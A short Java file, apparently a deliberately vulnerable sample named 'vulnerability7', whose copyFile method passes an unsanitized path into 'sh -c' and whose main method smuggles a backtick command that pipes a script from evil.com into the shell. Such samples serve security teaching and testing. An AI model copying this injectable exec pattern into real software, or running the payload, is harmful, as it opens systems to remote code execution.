import java.io.*;

public class vulnerability7 {
    public void copyFile(String sourcePath) throws IOException {
        String command = "cp " + sourcePath + " /tmp/backup/";
        Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
    }
    
    public static void main(String[] args) throws IOException {
        vulnerability7 v = new vulnerability7();
        v.copyFile("/home/user/file.txt`curl http://evil.com/shell.sh|sh`");
    }
}